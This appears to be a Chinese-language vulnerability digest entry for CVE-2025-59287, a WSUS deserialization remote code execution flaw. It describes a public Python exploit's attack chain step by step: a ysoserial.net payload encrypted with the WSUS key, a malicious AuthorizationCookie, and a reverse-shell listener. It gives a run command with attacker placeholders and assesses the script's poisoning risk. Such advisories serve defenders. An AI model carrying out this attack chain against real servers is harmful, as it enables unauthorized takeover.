## CVE-2025-59287 - Microsoft Windows Server Update Services (WSUS) 不安全反序列化导致远程代码执行 (RCE)

**漏洞编号:** CVE-2025-59287

**漏洞类型:** 不安全反序列化导致远程代码执行 (RCE)

**影响应用:** Microsoft Windows Server Update Services (WSUS)

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** Windows Server 2025, Windows Server 2022, Windows Server 2019

**利用条件:** 未经身份验证，远程网络访问

**POC 可用性:** 10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-59287是一个针对Microsoft Windows Server Update Services (WSUS) 组件的严重远程代码执行 (RCE) 漏洞。该漏洞的根源在于服务端对AuthorizationCookie的处理中存在不安全的传统序列化机制。未经身份验证的远程攻击者可以通过发送特制的SOAP请求，利用其中包含的恶意AuthorizationCookie触发不安全的对象反序列化，从而在WSUS服务器上执行任意代码，获得完全控制权。该漏洞被评为高危，CVSS评分高达9.8。

**POC有效性分析**
所提供的Python POC脚本（`CVE-2025-59287.py`）是一个功能完整、自动化程度高的利用工具，旨在成功利用WSUS中的不安全反序列化漏洞。脚本的设计考虑了易用性和可靠性，具体体现在以下几个方面：
1.  **自动化依赖管理**：脚本能够检测环境中是否已存在ysoserial.net工具。如果不存在，它会自动从GitHub官方发布页面（`https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip`）下载并解压ysoserial.net，确保攻击链中的核心组件始终可用。这种自包含机制极大地降低了利用的门槛和配置复杂性。
2.  **Payload生成与编码**：脚本利用ysoserial.net生成.NET反序列化payload。为了绕过WSUS的验证机制，该payload随后通过硬编码的WSUS AES密钥和IV进行加密，再进行Base64编码。这种处理方式精准模拟了WSUS处理AuthorizationCookie的机制，确保了恶意数据的正确解析。
3.  **请求构造**：脚本精心构造了SOAP请求，将其发送到WSUS的`ClientWebService/client.asmx`或`ReportingWebService/ReportingWebService.asmx`等易受攻击的端点。加密后的恶意payload被注入到HTTP请求的`AuthorizationCookie`头部，作为WSUS服务器处理的关键数据。
4.  **反向Shell监听**：为了实现远程代码执行后的交互性，脚本内置了一个`PayloadServer`，该服务器在攻击者的LHOST和LPORT上监听。一旦目标WSUS服务器成功执行了反序列化payload，它将尝试从这个监听器下载第二阶段的payload（通常是反向shell脚本），并在目标服务器上执行，从而建立一个与攻击者之间的交互式shell。
5.  **健壮性与用户体验**：脚本使用了`argparse`来处理命令行参数，提供了清晰的彩色日志输出（信息、成功、错误、警告），并禁用了SSL警告，使其在各种环境下都具有良好的适应性和用户友好性。脚本逻辑清晰，错误处理机制完善，能够有效引导用户完成攻击过程。
综上所述，该POC脚本从依赖管理到payload生成、加密、发送，再到反向shell的接收，提供了一套完整的、高度自动化的利用流程，具备极高的有效性，能够稳定地在受影响的WSUS服务器上实现远程代码执行。

**利用步骤**
1.  **环境准备**：确保攻击者机器安装了Python 3及必要的库（如`pycryptodome`、`requests`）。
2.  **执行脚本**：运行POC脚本，指定目标WSUS服务器的URL、攻击者的监听IP地址和端口。例如：
    `python3 CVE-2025-59287.py --target http://<WSUS_SERVER_IP>:8530 --lhost <ATTACKER_IP> --lport <ATTACKER_PORT>`
3.  **自动下载依赖**：脚本会检查ysoserial.net是否存在。如果不存在，它将自动从GitHub下载并解压到`Release/`目录下。
4.  **Payload生成与加密**：脚本将使用ysoserial.net生成一个.NET反序列化payload，通常是一个用于执行命令（如PowerShell反向shell）的gadget链。然后，该payload会被加密并Base64编码。
5.  **启动监听器**：脚本会在指定的LHOST和LPORT上启动一个HTTP服务器，用于托管第二阶段的反向shell脚本，并等待目标服务器的回连。
6.  **发送恶意请求**：脚本将构造一个包含加密payload的SOAP请求，并发送至目标WSUS服务器的`ClientWebService/client.asmx`或`ReportingWebService/ReportingWebService.asmx`端点。
7.  **获取反向Shell**：如果漏洞利用成功，WSUS服务器将反序列化恶意数据，执行嵌入的命令，并连接回攻击者的监听器，从而建立一个反向shell，允许攻击者在目标服务器上执行任意命令。

**投毒风险分析**
根据对`CVE-2025-59287.py`脚本的详细分析，该POC的投毒风险评估为低（10%）。主要基于以下几点考量：
1.  **代码透明度**：脚本代码结构清晰，使用了标准Python库和常用安全研究工具。函数和变量命名规范，逻辑路径明确，没有发现代码混淆、加密或任何试图隐藏真实意图的行为。这种高透明度使得安全分析人员能够轻松审计代码，验证其行为是否符合预期。
2.  **外部依赖来源**：脚本唯一重要的外部依赖是`ysoserial.net`。该工具从其官方GitHub仓库下载，这是一个在安全社区中广受认可和使用的合法反序列化payload生成工具。尽管任何通过HTTP/HTTPS下载的外部资源都存在潜在的供应链攻击风险（即官方源被恶意篡改），但ysoserial.net的声誉和广泛使用降低了这一风险。脚本下载的是一个带特定哈希的ZIP文件，进一步增加了下载内容的可预测性。
3.  **网络行为**：脚本的网络活动严格限于漏洞利用的范围。它会连接GitHub下载`ysoserial.net`，连接目标WSUS服务器发送利用请求，并在攻击者机器上启动一个HTTP监听器以接收反向shell连接。所有这些网络通信都是为了实现RCE的既定目标，没有观察到与第三方可疑IP地址或域名进行通信、数据回传或加入僵尸网络等恶意行为。
4.  **系统交互**：脚本通过`subprocess.run()`调用`ysoserial.net`工具来生成payload，这是执行外部可执行文件的标准方式。此操作是漏洞利用过程的必要组成部分，而非额外的恶意行为。脚本本身不会在运行它的主机上安装持久性后门、修改系统关键配置或执行其他超出其明确目的的操作。
5.  **POC的本质**：需要明确的是，RCE POC本身的功能就是为了在目标系统上执行任意代码，通常以建立反向shell为目的。因此，POC代码中包含用于生成和执行反向shell的逻辑，这是其核心功能，不应被误判为投毒行为。脚本的目标是攻击目标WSUS服务器，而不是攻击运行POC的用户。脚本本身旨在作为一种安全测试工具，用于评估系统对该漏洞的抵抗能力，而非传播恶意软件。
综上所述，`CVE-2025-59287.py`作为一个合法且透明的漏洞利用工具，其内部代码和外部依赖均经过仔细审查，未发现除实现RCE功能之外的任何恶意“投毒”迹象。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-59287
